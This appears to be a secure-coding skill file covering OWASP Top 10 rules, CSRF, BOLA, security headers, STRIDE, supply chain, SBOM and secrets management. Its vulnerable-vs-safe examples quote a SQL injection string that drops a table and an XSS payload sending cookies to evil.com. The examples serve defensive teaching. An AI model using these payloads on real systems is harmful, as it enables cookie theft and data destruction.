---
name: security-by-design
cluster: security-compliance
description: "Security as a design property, not an added layer. OWASP Top 10, supply chain security, secrets management, zero trust. Use when writing endpoints, handling user input, managing dependencies, or configuring infrastructure."
---

# Security by Design

> **Version**: 1.2.0 | **Last updated**: 2026-02-09

## Purpose

Security is a design property, not an added layer. Covers OWASP, supply chain security, dependency management, secrets management, and zero trust approach.

---

## OWASP Top 10 — Operational Rules

**Injection (SQL, NoSQL, OS command)**: never concatenate user input in queries. Use parameterized queries (Drizzle/Prisma do this natively), validate every input with Zod at API entry.

**Broken Authentication**: robust session management (see `authn-authz/SKILL.md`). Firebase ID tokens: 1hr (not configurable), use `checkRevoked` for sensitive ops. Custom auth: 15min access, 7d refresh. Rate limiting on login endpoints. No passwords in logs.

**Sensitive Data Exposure**: TLS everywhere (including service-to-service). Encryption at rest for sensitive data. Never credentials, tokens, or PII in URLs, logs, or unnecessary response bodies.

**Broken Access Control**: authorization at every level (API gateway, service, database query). Never trust the client for authorization decisions. Every endpoint verifies the user/service has permission for the specific resource.

**Security Misconfiguration**: mandatory HTTP security headers (Content-Security-Policy, X-Content-Type-Options, X-Frame-Options, Strict-Transport-Security). Disable headers revealing technology (X-Powered-By). Restrictive CORS (never `*` in production).

**Cross-Site Scripting (XSS)**: output sanitization (React and Vue do this by default with escaping, but beware `dangerouslySetInnerHTML` / `v-html`). Content-Security-Policy to block inline scripts.

### Concrete Vulnerability Examples

**SQL Injection — vulnerable vs safe**:

```typescript
// VULNERABLE — string concatenation
const query = `SELECT * FROM invoices WHERE tenant_id = '${tenantId}' AND status = '${status}'`;
// Attacker sends: status = "'; DROP TABLE invoices; --"

// SAFE — parameterized query (Drizzle ORM)
const invoices = await db
  .select()
  .from(invoicesTable)
  .where(and(eq(invoicesTable.tenantId, tenantId), eq(invoicesTable.status, status)));
```

**XSS — vulnerable vs safe**:

```typescript
// VULNERABLE — rendering user input as HTML
function Comment({ text }: { text: string }) {
  return <div dangerouslySetInnerHTML={{ __html: text }} />;
  // Attacker sends: text = '<script>document.location="https://evil.com/steal?c="+document.cookie</script>'
}

// SAFE — React auto-escapes by default
function Comment({ text }: { text: string }) {
  return <div>{text}</div>; // Script tags rendered as text, not executed
}

// SAFE — if HTML rendering is needed, sanitize first
import DOMPurify from 'dompurify';
function Comment({ text }: { text: string }) {
  return <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(text) }} />;
}
```

**Server-Side Request Forgery (SSRF)**: validate and restrict outbound URLs. Never allow user input to directly control server-side HTTP requests. Use allowlists for external service URLs. Block requests to internal networks (169.254.x.x, 10.x.x.x, localhost).

**Insecure Design**: security must be part of design, not bolted on. Threat model critical flows (see STRIDE below). Rate limit business operations (invoice creation, password resets), not just authentication.

**Software and Data Integrity Failures**: verify integrity of CI/CD pipelines, updates, and serialized data. Use signed artifacts, verify checksums, never deserialize untrusted data without validation.

**Security Logging and Monitoring Failures**: log security-relevant events (login attempts, permission denials, data access). Ensure logs are tamper-resistant and retained per compliance requirements (see `compliance-privacy/SKILL.md`).

### CSRF Protection

For cookie-based sessions (not typical with JWT Bearer, but relevant for SSR):

```typescript
// CSRF token middleware — required for state-changing requests with cookies
import { doubleCsrf } from 'csrf-csrf';

const { doubleCsrfProtection } = doubleCsrf({
  getSecret: () => process.env.CSRF_SECRET!,
  cookieName: '__csrf',
  cookieOptions: { httpOnly: true, sameSite: 'strict', secure: true },
});

app.use(doubleCsrfProtection); // Validates token on POST/PUT/PATCH/DELETE
```

For SPAs with JWT Bearer tokens: CSRF protection is implicit (attacker cannot set Authorization header cross-origin). Ensure CORS is restrictive.

### API Security (BOLA/IDOR)

**Broken Object Level Authorization (BOLA)**: the most common API vulnerability. Every endpoint must verify the requesting user has access to the specific resource, not just that they're authenticated.

```typescript
// VULNERABLE — only checks authentication, not authorization
app.get('/invoices/:id', authMiddleware, async (req, res) => {
  const invoice = await db.findInvoice(req.params.id); // Any user can access any invoice
  return res.json(invoice);
});

// SAFE — verifies tenant ownership
app.get('/invoices/:id', authMiddleware, tenantGuard, async (req, res) => {
  const invoice = await db.findInvoice(req.params.id, req.auth.tenantId);
  if (!invoice) return res.status(404).json({ error: 'Not found' });
  return res.json(invoice);
});
```

**Mass Assignment**: never bind request body directly to database model. Use explicit allowlists (Zod schemas) to control which fields are writable.

### Security Headers Middleware

```typescript
import helmet from 'helmet';

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"], // tighten if possible
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'", process.env.API_URL],
    },
  },
  hsts: { maxAge: 63072000, includeSubDomains: true, preload: true },
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
}));
```

### Threat Modeling (STRIDE)

For high-impact features, run a lightweight STRIDE analysis:

| Threat | Question | Mitigation |
|--------|----------|------------|
| **S**poofing | Can someone impersonate a user/service? | Strong auth, mTLS for services |
| **T**ampering | Can data be modified in transit/at rest? | TLS, integrity checks, signed tokens |
| **R**epudiation | Can someone deny an action? | Audit logs with correlation IDs |
| **I**nformation Disclosure | Can data leak to unauthorized parties? | Encryption, access control, log redaction |
| **D**enial of Service | Can the service be overwhelmed? | Rate limiting, autoscaling, circuit breakers |
| **E**levation of Privilege | Can a user gain unauthorized access? | RBAC, tenant isolation, least privilege |

Document STRIDE analysis in ADR for security-critical features.

---

## Supply Chain Security

### Dependency Management

**Lockfiles**: `package-lock.json` (npm) or `pnpm-lock.yaml` always committed. Use `npm ci` (not `npm install`) for reproducible builds.

**Audit in CI**: `npm audit` blocks build on critical/high vulnerabilities. Swift: `swift package audit` (if available) or Snyk.

**Update policy**: Dependabot or Renovate configured with:
- Automatic PRs for patch updates (auto-merge if tests pass)
- Weekly PRs for minor updates (manual review)
- Manual review for major updates (require ADR if significant)

### Dependency Review — Before Adding

Before any `npm install <package>`, verify:

| Check | Criteria |
|-------|----------|
| Active maintainer | Commits in last 6 months, responsive to issues |
| License | Compatible with project license (MIT, Apache 2.0 preferred) |
| Size | No bloat — check bundlephobia for frontend deps |
| Transitive deps | Fewer is better — large transitive trees increase attack surface |
| Downloads | Established packages preferred (>1000 weekly downloads) |
| Typosquatting risk | Verify exact package name, check for suspicious similar names |
| Recent publish | Very new packages (<30 days) with few downloads are higher risk |

Every `npm install` requires justification (why this dependency, why not a simpler alternative).

### Supply Chain Analysis

**Automated tools**: Snyk or Socket.dev for advanced analysis:
- Typosquatting detection (unusual names, low downloads, recent publish)
- Malicious code injection detection
- Install script analysis
- Network call detection in dependencies

### Build Reproducibility

- Pinned versions in lockfile (never `^` or `~` in production builds)
- Checksums verified by lockfile
- `npm ci` in CI (clean install from lockfile, not `npm install`)

---

## SBOM & Provenance

### SBOM (Software Bill of Materials)

Generate SBOM for **every release artifact** — mandatory, not optional.

**Format**: SPDX or CycloneDX (CycloneDX preferred for its broader tooling support).

**Contents**: direct + transitive dependencies, container base images and their dependencies, build tool versions, license information.

**Storage**: SBOM attached to GitHub Release as artifact, stored alongside container image in Artifact Registry.

**Generation in CI**:
```yaml
# In GitHub Actions release workflow
- name: Generate SBOM
  run: |
    npx @cyclonedx/cyclonedx-npm --output-file sbom.json
    # For containers: syft <image> -o cyclonedx-json > container-sbom.json
```

### Provenance (SLSA-aligned)

Record for every release artifact:
- Source code revision (git SHA)
- Build system identity (GitHub Actions runner)
- Build steps hash (workflow file hash)
- Signer identity (if signing is used)

GitHub Actions attestation:
```yaml
- uses: actions/attest-build-provenance@v1
  with:
    subject-path: 'dist/**'
```

---

## Secrets Management

**Never in code**: no secrets in committed .env files, Dockerfiles, or CI variables visible in logs.

**GCP Secret Manager** as centralized store. Services access secrets via SDK with IAM permission (least privilege: each service accesses only its own secrets).

**Rotation**: secrets have expiration. Rotation must be automated and not require deployment. Pattern: dual-read (service reads both old and new secret during rotation window).

**Local development**: `.env.local` file (in .gitignore) with development values. Never copy production secrets locally.

---

## Zero Trust

No resource is secure just because it's "internal." Every service boundary validates identity and authorization. Cloud Run + IAM for service-to-service auth (caller must have `roles/run.invoker` on the called service). For frontend calls: JWT validated on every request, never session based on IP or network position.

---

## For Claude Code

When generating code: Zod input validation on every endpoint, parameterized queries always, HTTP security headers in global middleware, no hardcoded secrets (use env vars referencing Secret Manager). Include `npm audit` in CI. Never `dangerouslySetInnerHTML` or `v-html` without explicit sanitization. When adding dependencies, document justification. Generate SBOM step in release CI workflow.

---

*Internal references*: `authn-authz/SKILL.md`, `compliance-privacy/SKILL.md`, `security-testing/SKILL.md`, `containerization/SKILL.md`
